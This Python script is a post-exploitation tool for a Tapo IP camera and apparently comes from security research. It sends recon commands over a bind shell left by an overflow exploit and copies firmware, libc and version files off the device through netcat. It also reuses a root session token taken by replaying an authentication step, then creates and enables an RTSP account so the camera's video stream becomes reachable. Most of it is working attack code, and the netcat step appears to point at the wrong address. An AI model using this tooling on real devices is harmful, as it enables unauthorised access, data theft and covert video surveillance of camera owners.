#!/usr/bin/env python3
"""Post-exploitation over the Tapo bind shell on :4444, plus RTSP provisioning.

The shell dies with the crashed process, so the order is: recon, then pull the
artifacts that cannot be recovered any other way (`/proc/mtd`, `/bin/main`,
`/etc/*version*`, libc) before anything else. Files land in
`/tmp/pane1/<host>/` and are size-checked.

RTSP is provisioned over the DS API (root `stok` from the empty-`cnonce`
replay), not the shell: `setAccountEnabled` + `changeThirdAccount` are the only
writes the app makes, and the third account is exactly the NVR credential
(EV-pack-H-012 §2, EV-pack-H-014 §2/§3). Config acceptance is not a listener —
`--rtsp-verify` is the only thing that proves 554 answers, and it says so.

Usage:
  tapo_post.py <host> [--pull] [--port 5555]
  tapo_post.py <host> --rtsp-enable [--rtsp-user U] [--rtsp-pass P] [--rtsp-reset]
  tapo_post.py <host> --rtsp-verify [--rtsp-user U] [--rtsp-pass P]
"""
import argparse
import base64
import hashlib
import json
import os
import re
import secrets
import socket
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)
# DS session client (login/req/post, AES response decrypt) is shared with the
# overflow sender rather than duplicated.
import tapo_connectap_sc as ds  # noqa: E402

RECON = (
    "id",
    "uname -a",
    "cat /proc/cmdline",
    "cat /proc/mtd",
    "mount",
    "df -h / /tmp",
    "ls -l /bin/main /usr/bin/dsd /etc/*version* 2>&1",
    "cat /etc/os-release 2>/dev/null; cat /version 2>/dev/null; cat /etc/*version* 2>&1 | head",
    "cat /proc/sys/kernel/randomize_va_space",
)

PULLS = ("/proc/mtd", "/bin/main", "/lib/libc.so.0")


def cmd(host: str, line: str, wait: float = 2.0) -> str:
    s = socket.create_connection((host, 4444), timeout=5)
    s.settimeout(wait)
    s.sendall((line + "\n").encode())
    time.sleep(0.4)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return out.decode("latin1", "replace")


def pull(host: str, remote: str, local: str, port: int, timeout: float = 180.0) -> bool:
    """Receive one file: listener here, `nc host port < remote` on the camera."""
    with open(local, "wb") as fh:
        srv = subprocess.Popen(["nc", "-l", str(port)], stdout=fh)
    time.sleep(0.6)
    cmd(host, "nc %s %d < %s" % (host, port, remote), wait=1.0)
    t0 = time.time()
    while srv.poll() is None and time.time() - t0 < timeout:
        time.sleep(0.5)
    if srv.poll() is None:
        srv.terminate()
    return os.path.getsize(local) > 0


# ---------------------------------------------------------------------------
# RTSP provisioning (fss-9tdk4)
#
# The app's only writes are `setAccountEnabled` and `changeThirdAccount`
# (EV-pack-H-014 §2: `model/AccountInfo.java` secondary constructor builds
# {"secname":"third_account","username":u,"passwd":MD5_HEX_UPPER,
#  "old_passwd":"","ciphertext":BASE64_RSA_PKCS1,"unique_key":N}).
# `setAccountEnabled` is `AccountEnable("third_account", enabled)` under
# `user_management.set_account_enabled`. Both were proven live on .4.70
# (EV-pack-H-012 §2, error_code 0). A reboot is required before ONVIF/RTSP
# starts (`syncHubReset` → `system.soft_reset`).
#
# Honest state, per the Wyze lesson: a 0 from the DS call means the config was
# accepted, NOT that 554 listens. Only a TCP connect + authenticated DESCRIBE
# says the listener is up.
# ---------------------------------------------------------------------------

RTSP_PORT = 554
ONVIF_PORT = 2020


def md5_upper(s: str) -> str:
    """`k.a` — MD5 hex, uppercase alphabet (k.java: char[] "0123456789ABCDEF")."""
    return hashlib.md5(s.encode()).hexdigest().upper()


def find_public_key(obj) -> str | None:
    """Depth-first search for the device PEM `public_key` in a scanApList answer."""
    if isinstance(obj, str):
        return obj if "BEGIN PUBLIC KEY" in obj else None
    if isinstance(obj, dict):
        for v in obj.values():
            found = find_public_key(v)
            if found:
                return found
    elif isinstance(obj, list):
        for v in obj:
            found = find_public_key(v)
            if found:
                return found
    return None


def rsa_pkcs1(pem: str, plaintext: str) -> str:
    """`k.f` — RSA/ECB/PKCS1Padding over the device key, base64 NO_WRAP.

    The app parses the PEM with BouncyCastle and encrypts the plaintext; the
    device decrypts with the matching private key. openssl is the local
    equivalent and needs no third-party module.
    """
    with tempfile.NamedTemporaryFile("w", suffix=".pem", delete=False) as fh:
        fh.write(pem)
        path = fh.name
    try:
        p = subprocess.run(
            ["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", path,
             "-pkeyopt", "rsa_padding_mode:pkcs1"],
            input=plaintext.encode(), capture_output=True)
    finally:
        os.unlink(path)
    if p.returncode != 0 or not p.stdout:
        raise SystemExit("RSA encrypt failed: %s" % p.stderr.decode("latin1").strip())
    return base64.b64encode(p.stdout).decode()


def third_account(host: str, sess: dict) -> dict:
    """`getThirdAccount` — {username, enabled, public_key} (H-014 §2)."""
    return ds.req(host, sess, {"method": "getThirdAccount",
                               "params": {"user_management": {"name": ["third_account"]}}})


def rtsp_enable(host: str, user: str, password: str, unique_key: int = 0,
                reset: bool = False) -> int:
    """Provision the third account and enable it. Returns 0 when both writes ack."""
    sess = ds.login(host)
    before = third_account(host, sess)
    print("before: %s" % json.dumps(before)[:300])

    scan = ds.req(host, sess, {"method": "scanApList", "params": {}})
    pem = find_public_key(scan)
    if not pem:
        print("no public_key in scanApList — cannot build the ciphertext")
        print("scanApList: %s" % json.dumps(scan)[:400])
        return 1

    enabled = ds.req(host, sess, {"method": "setAccountEnabled", "params": {
        "user_management": {"set_account_enabled": {
            "secname": "third_account", "enabled": "on"}}}})
    print("setAccountEnabled -> %s" % json.dumps(enabled)[:200])

    changed = ds.req(host, sess, {"method": "changeThirdAccount", "params": {
        "user_management": {"change_third_account": {
            "secname": "third_account",
            "username": user,
            "passwd": md5_upper(password),
            "old_passwd": "",
            "ciphertext": rsa_pkcs1(pem, password),
            "unique_key": unique_key}}}})
    print("changeThirdAccount -> %s" % json.dumps(changed)[:200])

    after = third_account(host, sess)
    print("after: %s" % json.dumps(after)[:300])
    print("account: %s / %s" % (user, password))

    ok = enabled.get("error_code") == 0 and changed.get("error_code") == 0
    if not ok:
        print("config NOT accepted (see error_code above)")
        return 1
    print("config accepted — not proof of a listener; run --rtsp-verify")

    if reset:
        r = ds.req(host, sess, {"method": "syncHubReset", "params": {"system": {"soft_reset": {}}}})
        print("soft_reset -> %s (unit drops off the LAN; wait for ARP)" % json.dumps(r)[:200])
    return 0


def _digest_answer(user: str, password: str, realm: str, nonce: str, uri: str,
                   qop: str | None, nc: str = "00000001",
                   cnonce: str = "fss0001") -> str:
    """RFC 2617 response. MD5 hex lowercase is the wire form (not the DS MD5)."""
    h = lambda s: hashlib.md5(s.encode()).hexdigest()  # noqa: E731
    ha1 = h("%s:%s:%s" % (user, realm, password))
    ha2 = h("DESCRIBE:%s" % uri)
    if qop:
        return ('Digest username="%s", realm="%s", nonce="%s", uri="%s", '
                'qop=%s, nc=%s, cnonce="%s", response="%s"'
                % (user, realm, nonce, uri, qop, nc, cnonce,
                   h("%s:%s:%s:%s:%s:%s" % (ha1, nonce, nc, cnonce, qop, ha2))))
    return ('Digest username="%s", realm="%s", nonce="%s", uri="%s", response="%s"'
            % (user, realm, nonce, uri, h("%s:%s:%s" % (ha1, nonce, ha2))))


def _rtsp_exchange(host: str, port: int, request: str, timeout: float = 5.0) -> str:
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    s.sendall(request.encode())
    buf = b""
    try:
        while b"\r\n\r\n" not in buf:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    finally:
        s.close()
    return buf.decode("latin1", "replace")


def rtsp_probe(host: str, user: str, password: str, port: int = RTSP_PORT,
               path: str = "/stream1", timeout: float = 5.0) -> dict:
    """One connection per request (the server allows one per source IP).

    Returns {listening, status, authenticated, challenge}. `status` is the
    DESCRIBE code; 401 means the listener is up and the account was rejected.
    """
    out = {"listening": False, "status": None, "authenticated": False, "challenge": None}
    try:
        socket.create_connection((host, port), timeout=timeout).close()
    except OSError as exc:
        out["error"] = repr(exc)
        return out
    out["listening"] = True

    uri = "rtsp://%s:%d%s" % (host, port, path)
    first = _rtsp_exchange(host, port, "DESCRIBE %s RTSP/1.0\r\nCSeq: 1\r\n\r\n" % uri, timeout)
    m = re.match(r"RTSP/\d\.\d (\d{3})", first)
    out["status"] = int(m.group(1)) if m else None
    if out["status"] == 200:
        out["authenticated"] = True
        return out
    if out["status"] != 401:
        return out

    chal = first.split("\r\n\r\n")[0]
    realm = re.search(r'realm="([^"]*)"', chal)
    nonce = re.search(r'nonce="([^"]*)"', chal)
    qop = re.search(r'qop="?([^",]*)', chal)
    out["challenge"] = chal
    if not (realm and nonce):
        return out
    auth = _digest_answer(user, password, realm.group(1), nonce.group(1), uri,
                          qop.group(1) if qop else None)
    second = _rtsp_exchange(host, port, "DESCRIBE %s RTSP/1.0\r\nCSeq: 2\r\nAuthorization: %s\r\n\r\n"
                            % (uri, auth), timeout)
    m = re.match(r"RTSP/\d\.\d (\d{3})", second)
    out["status"] = int(m.group(1)) if m else None
    out["authenticated"] = out["status"] == 200
    return out


def onvif_probe(host: str, port: int = ONVIF_PORT, timeout: float = 5.0) -> bool:
    """GetSystemDateAndTime answers without auth (H-014 §3) — ONVIF liveness."""
    body = ('<?xml version="1.0" encoding="UTF-8"?>'
            '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
            '<s:Body><GetSystemDateAndTime xmlns="http://www.onvif.org/ver10/device/wsdl"/>'
            '</s:Body></s:Envelope>')
    req = ("POST /onvif/service HTTP/1.0\r\nContent-Type: application/soap+xml\r\n"
           "Content-Length: %d\r\n\r\n%s" % (len(body), body))
    try:
        reply = _rtsp_exchange(host, port, req, timeout)
    except OSError:
        return False
    return reply.startswith("HTTP/") and " 200 " in reply.split("\r\n")[0]


def rtsp_verify(host: str, user: str, password: str, port: int = RTSP_PORT,
                onvif_port: int = ONVIF_PORT) -> int:
    """Report the real state. Never upgrades 'config accepted' to 'serving'."""
    onvif = onvif_probe(host, onvif_port)
    print("onvif %d: %s" % (onvif_port, "answers" if onvif else "no answer"))
    r = rtsp_probe(host, user, password, port)
    if not r["listening"]:
        print("rtsp %d: CLOSED (%s)" % (port, r.get("error", "")))
        print("verdict: not serving — config accepted is not a listener")
        return 1
    print("rtsp %d: listening, DESCRIBE %s" % (port, r["status"]))
    if r["authenticated"]:
        print("verdict: SERVING and the account authenticates")
        return 0
    if r["status"] == 401:
        print("verdict: listener up, account rejected (challenge: %s)"
              % (r["challenge"] or "").split("\r\n")[0])
        return 1
    print("verdict: listener up but not answering DESCRIBE")
    return 1


def present(host: str) -> bool:
    """Doctrine presence: ICMP reply AND a resolved ARP entry.

    ARP alone is not enough — a sleeping battery unit keeps its ARP entry
    (the radio answers) while the SoC serves nothing, and `arp -a` is empty in
    spawned subprocesses, so the census form is `sudo -n arp -an`.
    """
    icmp = subprocess.run(["ping", "-c", "1", "-W", "1", host],
                          capture_output=True).returncode == 0
    out = subprocess.run(["sudo", "-n", "/usr/sbin/arp", "-an"],
                         capture_output=True, text=True).stdout
    line = [ln for ln in out.splitlines() if "(%s)" % host in ln]
    resolved = bool(line) and "(incomplete)" not in line[0]
    return icmp and resolved


def wait_present(host: str, minutes: float, poll: float = 10.0) -> bool:
    """Block until both presence signals hold. 0 minutes waits forever."""
    deadline = None if minutes == 0 else time.monotonic() + minutes * 60
    last = None
    while True:
        now = present(host)
        if now is not last:
            print("wait: %s %s" % (host, "PRESENT" if now else "absent"), flush=True)
            last = now
        if now:
            return True
        if deadline is not None and time.monotonic() >= deadline:
            return False
        time.sleep(poll)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("--pull", action="store_true")
    ap.add_argument("--port", type=int, default=5555)
    ap.add_argument("--rtsp-enable", action="store_true",
                    help="setAccountEnabled + changeThirdAccount over the DS API")
    ap.add_argument("--rtsp-verify", action="store_true",
                    help="probe 554/2020 and DESCRIBE with the account")
    ap.add_argument("--rtsp-user", default="fssuser")
    ap.add_argument("--rtsp-pass", default=None,
                    help="default: random, printed once")
    ap.add_argument("--rtsp-unique-key", type=int, default=0,
                    help="device key index; 0 is the proven value (H-012 §2)")
    ap.add_argument("--rtsp-reset", action="store_true",
                    help="soft_reset after the writes (a reboot is required)")
    ap.add_argument("--rtsp-port", type=int, default=RTSP_PORT)
    ap.add_argument("--onvif-port", type=int, default=ONVIF_PORT)
    ap.add_argument("--wait", type=float, default=None,
                    help="minutes to wait for ICMP+ARP presence before acting (0 = forever, "
                         "only with --rtsp-enable/--rtsp-verify)")
    a = ap.parse_args()

    password = a.rtsp_pass or secrets.token_urlsafe(12)

    if a.rtsp_enable or a.rtsp_verify:
        if a.wait is not None and not wait_present(a.host, a.wait):
            print("wait: %s never became present" % a.host)
            return 2
    if a.rtsp_enable:
        return rtsp_enable(a.host, a.rtsp_user, password, a.rtsp_unique_key, a.rtsp_reset)
    if a.rtsp_verify:
        if not a.rtsp_pass:
            print("no --rtsp-pass given: using a random one, so the account will be rejected")
        return rtsp_verify(a.host, a.rtsp_user, password, a.rtsp_port, a.onvif_port)

    outdir = os.path.join("/tmp/pane1", a.host)
    os.makedirs(outdir, exist_ok=True)

    log = []
    for line in RECON:
        res = cmd(a.host, line)
        print("$", line)
        print(res.strip()[:2000])
        print()
        log.append("$ %s\n%s\n" % (line, res))
    open(os.path.join(outdir, "recon.txt"), "w").write("\n".join(log))

    if not a.pull:
        return 0

    targets = list(PULLS)
    versions = cmd(a.host, "ls /etc/*version* 2>/dev/null").split()
    targets += versions
    for i, remote in enumerate(targets):
        local = os.path.join(outdir, remote.strip("/").replace("/", "_"))
        ok = pull(a.host, remote, local, a.port + i)
        print("%-28s -> %s (%s)" % (remote, local, "ok" if ok else "EMPTY"))
    return 0


if __name__ == "__main__":
    sys.exit(main())
